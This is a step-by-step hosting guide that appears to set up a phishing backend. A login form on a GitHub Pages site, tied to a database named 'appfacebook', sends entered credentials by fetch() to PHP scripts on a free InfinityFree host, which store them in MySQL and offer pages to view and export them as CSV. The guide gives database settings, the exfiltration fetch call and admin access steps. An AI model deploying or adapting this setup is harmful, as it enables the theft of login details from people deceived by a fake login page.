# InfinityFree Hosting Setup Guide

This guide will walk you through setting up your InfinityFree hosting account and configuring the MySQL database to store credentials from your GitHub Pages site.

## 1. Create an InfinityFree Account

1. Go to [InfinityFree](https://infinityfree.net/) and sign up for a free account
2. Verify your email address

## 2. Create a Free Website

1. Log in to your InfinityFree account
2. Click on "New Free Website"
3. Choose a subdomain (e.g., `yourname.epizy.com`)
4. Complete the setup wizard

## 3. Access Control Panel

1. Once your website is created, click on "Control Panel"
2. This will take you to the main dashboard for managing your website

## 4. Set Up MySQL Database

1. In the Control Panel, go to "MySQL Databases" under the "Databases" section
2. Click "Create a new database"
3. Choose a database name (something simple like "appfacebook")
4. Note that InfinityFree automatically uses your vPanel (control panel) password for the database
5. Click "Create"
6. Note down your database details:
   - Database Name: `if0_USERNAME_appfacebook` (where USERNAME is your InfinityFree account name)
   - Database Username: `if0_USERNAME` (your InfinityFree account username)
   - Database Password: Your vPanel/control panel password
   - Database Host: `sql101.infinityfree.com` (or similar, check your control panel)

## 5. Import Database Structure

1. In the Control Panel, go to "phpMyAdmin" under the "Databases" section
2. Select your database from the left sidebar
3. Click on the "Import" tab
4. Choose the `setup_database.sql` file
5. Click "Go" to import the SQL file
6. This will create the `credentials` table in your database

## 6. Upload PHP Files

1. In the Control Panel, go to "File Manager" under the "Files" section
2. Navigate to the `htdocs` or `public_html` directory
3. Upload the following files:
   - `save_credentials.php`: Receives and stores credentials
   - `view_credentials.php`: Interface to view stored credentials
   - `export_credentials.php`: Allows exporting credentials as CSV
   - `.htaccess`: Contains security settings

## 7. Update Database Credentials

Edit each of the PHP files you uploaded and update the database connection details:

```php
$db_host = 'sql.infinityfree.com'; // InfinityFree MySQL server
$db_name = 'epiz_YOUR_DB_NAME'; // Your database name 
$db_user = 'epiz_YOUR_USER'; // Your database username
$db_pass = 'YOUR_PASSWORD'; // Your database password
```

Replace the placeholders with your actual database credentials noted in step 4.

## 8. Update GitHub Pages JavaScript

In your GitHub Pages app.js file, update the fetch URL to point to your InfinityFree domain:

```javascript
fetch('https://yourname.epizy.com/save_credentials.php', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
    },
    body: JSON.stringify(data)
})
```

Replace `yourname.epizy.com` with your actual InfinityFree subdomain.

## 9. Testing the Setup

1. Deploy your GitHub Pages site
2. Enter test credentials in the login form
3. Check if the credentials are stored by visiting `https://yourname.epizy.com/view_credentials.php`
   - Username: `admin` (or what you set in view_credentials.php)
   - Password: `your_secure_password` (or what you set in view_credentials.php)

## 10. Security Considerations

- Change the admin username and password in the `view_credentials.php` and `export_credentials.php` files
- Consider implementing IP restrictions for the admin pages
- Regularly export and clean up old data to stay within InfinityFree's storage limits

## Troubleshooting

- If you see CORS errors in the browser console, ensure your `.htaccess` file is correctly configured
- If database connections fail, double-check your database credentials
- If files aren't saving, check file permissions in the File Manager 